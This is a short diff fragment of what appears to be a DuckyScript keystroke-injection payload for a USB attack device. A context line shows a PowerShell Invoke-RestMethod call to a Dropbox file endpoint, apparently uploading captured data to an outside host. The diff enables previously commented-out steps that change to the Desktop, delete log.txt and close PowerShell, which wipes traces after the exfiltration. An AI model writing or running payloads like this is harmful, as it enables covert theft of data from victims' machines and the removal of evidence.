@@ -32,11 +32,14 @@ STRING $response = Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files
 ENTER
 DELAY 100
 REM bottom code with delete log.txt and exit powershell
-# STRING cd $env:USERPROFILE\Desktop
-# ENTER
-# DELAY 100
-# STRING del log.txt
-# ENTER
-# DELAY 100
-# STRING exit
-# ENTER
+STRING cd $env:USERPROFILE\Desktop
+ENTER
+ DELAY 100
+STRING del log.txt
+ENTER
+DELAY 100
+STRING exit
+ENTER
+DELAY 100
+STRING exit
+ENTER
